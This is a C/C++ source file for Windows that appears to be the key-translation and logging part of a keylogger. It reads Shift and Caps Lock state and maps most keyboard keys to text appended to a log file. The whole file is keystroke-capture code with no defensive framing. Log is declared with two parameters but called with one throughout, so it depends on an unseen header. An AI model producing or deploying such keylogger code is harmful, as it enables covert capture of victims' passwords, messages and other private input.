#include "Header.h"

void Log(char* input, const char fileName[]) {
	FILE* f = fopen(fileName, "a+");
	if (f) {
		fprintf(f, "%s\n", input);
		fclose(f);
	}
}

bool LogKey(int key) {
	caps = GetKeyState(VK_CAPITAL) & 1; // check toggled
	shift = GetAsyncKeyState(VK_SHIFT) & 0x8000; // check key down



	switch (key) {
		case 0x30: Log(shift ? "[ShiftDown])" : "0"); return true;
		case 0x31: Log(shift ? "[ShiftDown]!" : "1"); return true;
		case 0x32: Log(shift ? "[ShiftDown]@" : "2"); return true;
		case 0x33: Log(shift ? "[ShiftDown]#" : "3"); return true;
		case 0x34: Log(shift ? "[ShiftDown]$" : "4"); return true;
		case 0x35: Log(shift ? "[ShiftDown]%" : "5"); return true;
		case 0x36: Log(shift ? "[ShiftDown]^" : "6"); return true;
		case 0x37: Log(shift ? "[ShiftDown]&" : "7"); return true;
		case 0x38: Log(shift ? "[ShiftDown]*" : "8"); return true;
		case 0x39: Log(shift ? "[ShiftDown](" : "9"); return true;

		case 0x41: Log(caps ? (shift ? "[ShiftDown]a" : "A") : (shift ? "[ShiftDown]A" : "a")); return true;
		case 0x42: Log(caps ? (shift ? "[ShiftDown]b" : "B") : (shift ? "[ShiftDown]B" : "b")); return true;
		case 0x43: Log(caps ? (shift ? "[ShiftDown]c" : "C") : (shift ? "[ShiftDown]C" : "c")); return true;
		case 0x44: Log(caps ? (shift ? "[ShiftDown]d" : "D") : (shift ? "[ShiftDown]D" : "d")); return true;
		case 0x45: Log(caps ? (shift ? "[ShiftDown]e" : "E") : (shift ? "[ShiftDown]E" : "e")); return true;
		case 0x46: Log(caps ? (shift ? "[ShiftDown]f" : "F") : (shift ? "[ShiftDown]F" : "f")); return true;
		case 0x47: Log(caps ? (shift ? "[ShiftDown]g" : "G") : (shift ? "[ShiftDown]G" : "g")); return true;
		case 0x48: Log(caps ? (shift ? "[ShiftDown]h" : "H") : (shift ? "[ShiftDown]H" : "h")); return true;
		case 0x49: Log(caps ? (shift ? "[ShiftDown]i" : "I") : (shift ? "[ShiftDown]I" : "i")); return true;
		case 0x4A: Log(caps ? (shift ? "[ShiftDown]j" : "J") : (shift ? "[ShiftDown]J" : "j")); return true;
		case 0x4B: Log(caps ? (shift ? "[ShiftDown]k" : "K") : (shift ? "[ShiftDown]K" : "k")); return true;
		case 0x4C: Log(caps ? (shift ? "[ShiftDown]l" : "L") : (shift ? "[ShiftDown]L" : "l")); return true;
		case 0x4D: Log(caps ? (shift ? "[ShiftDown]m" : "M") : (shift ? "[ShiftDown]M" : "m")); return true;
		case 0x4E: Log(caps ? (shift ? "[ShiftDown]n" : "N") : (shift ? "[ShiftDown]N" : "n")); return true;
		case 0x4F: Log(caps ? (shift ? "[ShiftDown]o" : "O") : (shift ? "[ShiftDown]O" : "o")); return true;
		case 0x50: Log(caps ? (shift ? "[ShiftDown]p" : "P") : (shift ? "[ShiftDown]P" : "p")); return true;
		case 0x51: Log(caps ? (shift ? "[ShiftDown]q" : "Q") : (shift ? "[ShiftDown]Q" : "q")); return true;
		case 0x52: Log(caps ? (shift ? "[ShiftDown]r" : "R") : (shift ? "[ShiftDown]R" : "r")); return true;
		case 0x53: Log(caps ? (shift ? "[ShiftDown]s" : "S") : (shift ? "[ShiftDown]S" : "s")); return true;
		case 0x54: Log(caps ? (shift ? "[ShiftDown]t" : "T") : (shift ? "[ShiftDown]T" : "t")); return true;
		case 0x55: Log(caps ? (shift ? "[ShiftDown]u" : "U") : (shift ? "[ShiftDown]U" : "u")); return true;
		case 0x56: Log(caps ? (shift ? "[ShiftDown]v" : "V") : (shift ? "[ShiftDown]V" : "v")); return true;
		case 0x57: Log(caps ? (shift ? "[ShiftDown]w" : "W") : (shift ? "[ShiftDown]W" : "w")); return true;
		case 0x58: Log(caps ? (shift ? "[ShiftDown]x" : "X") : (shift ? "[ShiftDown]X" : "x")); return true;
		case 0x59: Log(caps ? (shift ? "[ShiftDown]y" : "Y") : (shift ? "[ShiftDown]Y" : "y")); return true;
		case 0x5A: Log(caps ? (shift ? "[ShiftDown]z" : "Z") : (shift ? "[ShiftDown]Z" : "z")); return true;

		case VK_OEM_1:  Log(shift ? "[ShiftDown]:" : ";"); return true;
		case VK_OEM_2:  Log(shift ? "[ShiftDown]?" : "/"); return true;
		case VK_OEM_3: Log(shift ? "[ShiftDown]~" : "`"); return true;
		case VK_OEM_4: Log(shift ? "[ShiftDown]{" : "["); return true;
		case VK_OEM_5: Log(shift ? "[ShiftDown]|" : "\\"); return true;
		case VK_OEM_6: Log(shift ? "[ShiftDown]}" : "]"); return true;
		case VK_OEM_7: Log(shift ? "[ShiftDown]\"" : "'"); return true;
		case VK_OEM_PLUS:  Log(shift ? "[ShiftDown]+" : "="); return true;
		case VK_OEM_COMMA: Log(shift ? "[ShiftDown]<" : ","); return true;
		case VK_OEM_MINUS: Log(shift ? "[ShiftDown]_" : "-"); return true;
		case VK_OEM_PERIOD:Log(shift ? "[ShiftDown]>" : "."); return true;

		case VK_ESCAPE: Log("[ESC]"); return true;
		case VK_F1: Log("[F1]"); return true;
		case VK_F2: Log("[F2]"); return true;
		case VK_F3: Log("[F3]"); return true;
		case VK_F4: Log("[F4]"); return true;
		case VK_F5: Log("[F5]"); return true;
		case VK_F6: Log("[F6]"); return true;
		case VK_F7: Log("[F7]"); return true;
		case VK_F8: Log("[F8]"); return true;
		case VK_F9: Log("[F9]"); return true;
		case VK_F10: Log("[F10]"); return true;
		case VK_F11: Log("[F11]"); return true;
		case VK_F12: Log("[F12]"); return true;
		case VK_SNAPSHOT: Log("[PrtScn]"); return true;
		case VK_SCROLL: Log(GetKeyState(VK_SCROLL) & 1 ? "[ScrLk On]" : "[ScrlLk] Off"); return true;
		case VK_PAUSE: Log("[PauBrk]"); return true;

		case VK_INSERT: Log("[Ins]"); return true;
		case VK_HOME: Log("[Home]"); return true;
		case VK_PRIOR: Log("[PgUp]"); return true;
		case VK_DELETE: Log("Del "); return true;
		case VK_END: Log("[End]"); return true;
		case VK_NEXT: Log("[PgDn]"); return true;

		case VK_BACK: Log("[BackSpace]"); return true;
		case VK_TAB: Log("[Tab]"); return true;
		case VK_CAPITAL: Log(GetKeyState(VK_CAPITAL) & 1 ? "[CapsLk On]" : "[CapsLk Off]"); return true;
		case VK_RETURN: Log("[Enter]"); return true;
		case VK_SHIFT: Log("[Shift]"); return true;
		case VK_CONTROL: Log("[Ctrl]"); return true;
		case VK_MENU: Log("[Alt]"); return true;
		case VK_SPACE: Log("[Space]"); return true;
		case VK_LWIN: Log("[LWin]"); return true;
		case VK_RWIN: Log("[RWin]"); return true;

		case VK_UP: Log("[Up]"); return true;
		case VK_DOWN: Log("[Down]"); return true;
		case VK_LEFT: Log("[Left]"); return true;
		case VK_RIGHT: Log("[Right]"); return true;

		case VK_NUMLOCK: Log(GetKeyState(VK_NUMLOCK) & 1 ? "[NumLk On]" : "[NumLk Off]"); return true;
		case VK_NUMPAD0: Log("[NUMPAD0]"); return true;
		case VK_NUMPAD1: Log("[NUMPAD1]"); return true;
		case VK_NUMPAD2: Log("[NUMPAD2]"); return true;
		case VK_NUMPAD3: Log("[NUMPAD3]"); return true;
		case VK_NUMPAD4: Log("[NUMPAD4]"); return true;
		case VK_NUMPAD5: Log("[NUMPAD5]"); return true;
		case VK_NUMPAD6: Log("[NUMPAD6]"); return true;
		case VK_NUMPAD7: Log("[NUMPAD7]"); return true;
		case VK_NUMPAD8: Log("[NUMPAD8]"); return true;
		case VK_NUMPAD9: Log("[NUMPAD9]"); return true;
		case VK_DIVIDE: Log("/ "); return true;
		case VK_MULTIPLY: Log("* "); return true;
		case VK_SUBTRACT: Log("- "); return true;
		case VK_ADD: Log("+ "); return true;
		case VK_DECIMAL: Log(". "); return true;

	}

	return false;
}


